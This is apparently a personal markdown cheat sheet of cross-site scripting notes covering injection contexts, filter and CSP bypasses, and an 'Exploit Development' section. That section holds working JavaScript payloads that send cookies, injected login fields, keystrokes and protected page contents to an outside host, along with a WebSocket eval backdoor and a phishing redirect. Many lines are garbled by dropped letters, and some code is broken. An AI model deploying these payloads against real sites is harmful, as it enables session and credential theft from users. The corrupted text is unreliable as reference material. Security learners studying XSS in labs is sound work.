### Table of Contents
1. CONTEXTUAL EXECUTION: What CONTEXT can I EXECUTE Inside?

2. Bypass Filter/Sanitization
3. Exploit Development
4. Headers
5. Tags
6. Tips

**Cheat Sheet**
[Portswigger Cheat Sheet]: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
[Above Downloaded File]: /sec/web/xss/xss-cheat-sheet.pdf

**Other Resources**
[AppSecEU Slides & Videos]: https://2017.appsec.eu/slides-and-videos
[Course]: https://chefsecure.com/courses/xss

**Strategy**
1. Look At the Context I'm Injecting In
2. See if it's impossible (such as angle brackets in html tag is sanitized)
3. Make a customized payload for that context

**Alert Examples**
1. `alert(document.domain);`
2. `alert(1);` - try to stay away from this
5. `delete alert;alert(1)`
4. `FF: Components.lookupMethod(window, 'alert') (1)`
5. `alert(document.cookie)`

**JS Beautify**
beautifier.io 
jsnice.org

------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------

# 1. CONTEXTUAL EXECUTION: What CONTEXT can I EXECUTE Inside? 

 + Note that things in `()` runs first like in math
 + Browser doesn't care about dangling _closing tags_ like `</textarea>`
  - or a lack of one `<iframe><iframe></iframe>`

### Contextual Execution - Table of Contents 
 1. HTML Attributes
   + Breaking Out of Context 
   + Use `eval()`
   + Using `regex`
   
 2. URLs
 3. Event Handling
 4. Inside JS `<script>` Tags
 5. XS-Search
 6. Execution Without `script` Keyword 


       ============================================================


## [Contextual Execution] (1) - HTML Attributes
+ Us: Html Atributs, Html Tags, & JS Functions
``` 
Tempte:              | Example:
                     |
    ---- attrbutes   |                         tag      value
                     |                          |         |
                     |                          V         v
 tag "value"         | <h1 class "hover-title" title="something">Hover</h1>
```

### Breaking Out of Context 
 1. ` - singequtoes:  `'(payload)`
 2. ` - doubl qutoes: `"(payload)`
 3. ace Charaters: `(space, \f, \n, \r, \t)`

+ Examples
 - Bic: `"><sript>alert(document.domain)</script>`
 - Bic: `"</txtarea><script>alert(document.domain)</script>`

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

### Use `eval()`

* Has an example: https://www.youtube.com/watch?v=eQFbG6CwwdI
```Use_eval()
<output name="alert(1)" onclick="eval(name)">X</output>
                 v                     ^
                 |                     |
                 +---------------------+
           `eval` grabs the tag value `name`
          and puts it inside the `onclick` tag
```

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

### Using `regex`

* Good example: https://www.youtube.com/watch?v=eQFbG6CwwdI

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


     ===========================================================


## [Contextual Execution] (2) - URLs
* Us: Html Atributes, Html Tags, JS Functions, URL Schemes
* No that `jaascript:alert()` or `"javascript:alert()"` should work regardless of quotes

+ Pontial TagTargets 
 - Link:   <a href="{{input_from_url}}">Link</a>
 - iFrame: <iframe src="{{input_from_url}}"></iframe>
 
+ Examples:
 - `javacript:alert(document.domain)`

+ Sale Result that pull from URL:

 - location = 'javascript:alert()'
 - <iframe src=javascript:alert()></iframe>
 - <href=javacript:alert()>Link></a>
 
+ `<>` Elemens is _NOT going to work_ cause it _doesn't host content_ from another webpage


     ===========================================================

    
## [Contextual Execution] (3) - Event Handling
* Us: CSS, Evnts, Event Handling, Html Attributes, JS Fucntions, URL Encoding
* Secheat shet _xss-cheat-sheet.pdf_ for more

+ Sale Events
 - _oload_: eecutes given javascript function when tag loads
  * dy Tag Exmple: `<body onload=alert(‘Welcome to Hacking Articles’)>`
 - _error_
  * img src=ivalid onerror=alert()>`
 - _mouseover: when a user moves his cursor over a specific text
  * a onmousever=alert(“50% discount”)>surprise</a>`
 - _c._
 

+ Exples
 - `nload=alet'()`  --->  `class ='title 'onload'='alert()'`


+ Us**CSS Stying** to change _how things appear_ on the website
 - C use `stye`                                                           v--- url encoding
 - Emple: `'omouseover=alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`
                                                                          ^--- % is \x25
                                                                          
 - Sf-Delete style: `"onmouseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');`
  * n put thi  in between `onmouseover=` and `alert();`
  
 - Fl: `'onmoseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`


     ===========================================================


## [Contextual Execution] (4) - Inside JS `<script>` Tags
* Us: JS Arras/comments/functions/numbers/strings/objects/operators/template literals
* Brser will parse Html BEFORE running JS_
* Th **assume you're input/source is INSIDE** `<script>` & `</script>`

     - - - -  - - - - - - - - - - - - - - - - - - - - - - - - -

     **Break ut of String Context** within `<script>` & `</script>`
    + To _preent errors_, surround payload with _proper quotes_ and `+`s or `-`s
     - In thetemplates below the `'`, `"`, `backticks` are used to _exit the string context_
     - Then te `+` or `-` help prevent the JS for failing
    ``Templats
    script>
       ''+payoad+''   ''-payload-''
       ""+payoad+""   ""-payload-""
       ``+payoad+``   ``-payload-``
    /script>
    ``
    ``Example
    script>
     ''+alert)+'' 
      var inpt = ''+alert()+''
    /script>
    ``
    
    + When usng the **backtick**, while it can be used in a string, it can also _hold code_:
    `BACKTICK_Inject_Code
    `${code}`
    `${alert(}`
    ^---------- Only works on backticks (not "" or '')
    `

    + Use a _losing with an opening_ tag `</script><script>`
    ```Exampl
    script>
    let s = '/script><script>alert()//'
    /script>
    ```

     - - - -  - - - - - - - - - - - - - - - - - - - - - - - - -


     **Break ut of Array Context** within `<script>` & `</script>`
    ``',alert'
    1,'',aler(),'']
    `
    `',x:aler(),'
    umber:1,nme'',x:alert(),y:''}
    ``

     ===========================================================


## [Contextual Execution] (5) - XS-Search
[LiveOverflow]: https://www.youtube.com/watch?v=HcrQy0C-hEA
       
## [Contextual Execution] (6) - Without the `script` Keyword

+ In the section: _2. Bypass Filter/Sanitization_ 
 - Look at this subsection: _[Bypassing] (2) - Bypass Filters_

------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------

# 2. Bypass Filter/Sanitization

[OWASP Cheat Sheet]: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

**Things to Try**

+ If the _"_ doesn't break out of class attribute context
 - Just throw in a _'_ or _`_ to see if it works


### Bypass Filter/Sanitization - Table of Contents 
 1. Polyglot 
 2. Bypass Filters 
 3. XSS Payload Without = `javascript:`, `on*=*`, `alert()`
 4. XSS Payload Without - &<>"=() 
 5. Bypass CSP 
 6. JS Fuck 
 7. JSONP 
 8. Regex 
 9. Regex Bypass for Safari

## [Bypassing] (1) - Polyglot
+ Single payload to test multiple things
+ Payload of All Things Has Some Examples
  ```Things_Tested
     Events         | Event Handlers |            |              |
     HTLM Elements  |                |            |              |
     JS Comments    | JS Functions   | JS Strings | JS Operators | JS Regex
     URL Encoding   | URL Schemes    |            |              |
  ```

+ Can use comments `//` or `/**/` to comment out stuff

+ js allows algebra non nan (not a number) using `*-` without throwing an error

+ parentheses `()` follow before JS like `onload=alert()`

## [Bypassing] (2) - Bypass Filters 

**Without `<script>` keyword**
+ Can use `tags` lik _audio, iframe, svg, etc._
+ `<audio src/onerror=alert(1)>`
+ `<iframe/oNloAd=alert(1)//>`

**Space**
+ Can use `/` after tag name instead of a space
  `<iframe/oNloAd=alert()//>`
+ Use _URL Encoding_
 - The Browser will _AUTOMATICALLY DECODE URL encoded values_
 - Encoded URL parameters get decoded when variables from URL 

## [Bypassing] (3) - XSS Payload Without = `javascript:`, `on*=`,`alert()`

+ Space Characters: `(space, \f, \n, \r, \t)`
+ Capitalization: `jAvaScriPt`
+ Look at the payload of all things for more
  [Payload of All Things]: https://github.com/swisskyrepo/PayloadsAllTheThings

## [Bypassing] (4) - XSS Payload Without - &<>"=()
[Link]: https://security.stackexchange.com/questions/173032/xss-payload-without

**Script Gadgets**
[Script Gadgets]: /sec/web/xss/Bypassing XSS mitigations via Script gadgets.pdf
[Video]: https://www.youtube.com/watch?v=p07acPBi-qw&list=PLpr-xdpM8wG8RHOguwOZhUHkKiDeWpvFp&index=4

+ DOM XSS notes has more detail on this
       
       
## [Bypassing] (5) - Bypass CSP
* Uses: CSP, CSS, Html Comments, Html Elements, JS Fucntions, URLs

+ _Whitelisting generic CDN domains_ - `generic.cdn.example.com`
 - Attacker can upload own scripts

+ Check if the _nonce_ value is properly set:
  ```Example
  <meta http-equiv="Content-Security-Policy" content="
      default-src 'self'; script-src 'self' 'nonce-rAnd0m';
  ">
  
  <script nonce="rAnd0m">
  	doWhatever();
  </script>
  ```

+ `base-uri` is not set:
     <base href="https://evil.example.com">
 - Once hijacked, relative URLs are vulnerable
 - I just make my evil.example.com have the same `href`/`forms`

+ `form-action` - specifies where forms can submit their data
   If it's not set:
     <form action=https://evil.example.com>
       <!--inputs-->
     </forms>

+ `script-src` that allow XSS:
 - `script-src 'unsafe-inline'`
 - `script-src http`
 - `script-src https`
 - `script-src *`

+ `img-src` - FIREFOX SPECIFIC
 - Stealing With Images
 - Only _works if image is above the html content_
 - Can transport sensitive info like cookies over using JS
   `<img src='https://evil.example.com?`
 - If you look at the _nework tab_ in the _developer tools_ the html from the webpage can be send

## [Bypassing] (6) - JS Fuck
[Link]: http://www.jsfuck.com/
+ Javascript only using: `[]()!` -  may be some other

## [Bypassing] (7) - JSONP
* CORS Attack
[There's a chapter on JSONP - LiverOverflow]: https://www.youtube.com/watch?v=aCexqB9qi70

## [Bypassing] (8) - Regex
+ Break out of _regex context_ with the `/`
+ `*-` after the forward slash is ok and won't throw an error so long as 
+ Parantheses `()` 

## [Bypassing] (9) - Regex Bypass for Safari
1. Use regex format in _Safari_
[LiveOverflow]: https://www.youtube.com/watch?v=eQFbG6CwwdI
```Regex_Format
<base href="javascript:/a/-alert(1)/">
                            ^this gets executed
<a href="test.html">click</a>
```

 +  Adding `//////` to bypass potential combining of `base` and `href`
```//////
                                    v----these will combine with `../` below
<base href="javascript:/a/-alert(1)/////////">                    |
                                                                  |
<a href="../../../lol/test.html">click</a>                        |
         ^--------------------------------------------------------+
```

------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
    

# 3. Exploit Development
* Uses: CSS Selectors, Events, Event Handlers, JS Ajax Requests, JS Functions,
        JS HTML Collections, JS strings, JS objects, JS variables, JSON encoding,
        URLs
 [Chef Secure]:  https://chefsecure.com/courses/xss/recipes/how-to-create-real-xss-exploits-to-attack-websites
 [12 XSS]: https://chefsecure.com/blog/the-12-exploits-of-xss-mas-infographic
  * Some were not included

  **Confirm XSS**
   * In case there's an sandboxed `iframe` that is WAI (working as intended):
   ```Option1
       alert(document.domain)
       alert(window.origin)
   ```
  
  **Cookie/Credential Stealing** 
   ```Option1
       alert(document.cookie)
   ```
   ```Option2
       fetch(`https://example.com?cookie=${
        encodeURIComponent(document.cookie)}`)
   ```
   ```Option3
       f=document.createElement('form')
       u=document.createElement('input')
       u.setAttribute('type','text')
       u.setAttribute('name','username')
       p=document.createElement('input')
       p.setAttribute('type','password')
       p.setAttribute('name','password')
       f.appendChild(u)
       f.appendChild(p)
       document.body.appendChild(f)
       document.addEventListener('click',()=>{
         fetch(`https://example.com/?u=${
            u.value}&p=${p.value}
         `)    
       })
   ```

  **Keylogging**
   ```
       document.addEventListener('change', (e)=>{
         if(!e.target.matches('input,textarea'))
           return
         fetch('https://example.com',{
           method: 'POST',
           headers: {
             'Content-Type':'application/json'
           },
           body:JSON.stringify({
             key: e.target.value
           })
         })
       })
   ```
  
  **Macros - Malicious Macros**
   ```
       f=document.createElement('iframe')
       f.src='https://example.com/important.doc'
       document.body.appendChild(f)
   ```

  **Protected Pages**
   ```
       fetch('/page')
         .then((p)=>p.text()
           .then((t)=>
             fetch('https://example.com', {
               method:'POST',
               headers:{
                 'Content-Type':
                   'application/json'
               },
               body:JSON.stringify({p:t})
             }
           )
         )
       )
   ```
   
  **Redirection**
   ```Option1
       window.location = 'https://example.com/phishing-page'
   ```
   
  **Reverse Shell**
   ```Option1
       s=new WebSocket('wss://example.com')
       s.onmessage=(e)=>eval(e.data)
   ```

  **Screenshots**
   ```
       html2canvas(document.body)
         .then((c)=>fetch(
           {
             method: 'POST',
             headers: {
               'Content-Type':'application/json'
             },
             body: JSON.stringify({
               img: c.toDataURL()
             })
           }
                    )
         )
   ```


------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
  

# 4. Headers

   ============================================================


**CSP - Content Security Policy**
[Link]: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+ Reduce or eliminate the vectors for XSS by _specifying the domains_ that the browser should 
  consider to be _valid sources of executable scripts_
 - Only executes scripts loaded in source files for allowed domains
  
+ `X-Content-Security-Policy` & `X-WebKit-CSP` is an older version
+ `Content-Security-Policy: <directive> <value>;<directive> <value>`

+ HTML
`<meta http-equiv="Content-Security-Policy" content="<directive> <value>; <directive> <value>"`
+ Restrict Where Scripts are Run
`Content-Security-Policy: script-src https://somedomain:8080`


   ============================================================


**HSTS - Html Strick Transport Security**
+ Ensures browser is using `HTTPS` so communication is encrypted


   ============================================================


------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------


# 5. Tags

**Anchor Tag**
`<a href="javascript:alert(1)">click</a>`


**Base Tag**
+ `href` is done by _combinbing_ the `base` tag with the `href`


------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------


# 6. Tips

## [TIPS] (1) - Cause a JS Error to see how browser sees it

1. Write something that will cause an error
```JS_Error
                                     v------look at x.x
<base href="javascript:/**/-alert(1);x.x">
<a href="test.html">click</a>
```
2. Look at the _Console_ in _Developer Tools_
  + Find the error `Can't find variable:x`
3. Click on `Script Element` to see the script with the error
  + You should now see how the browser sees your input 


------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------


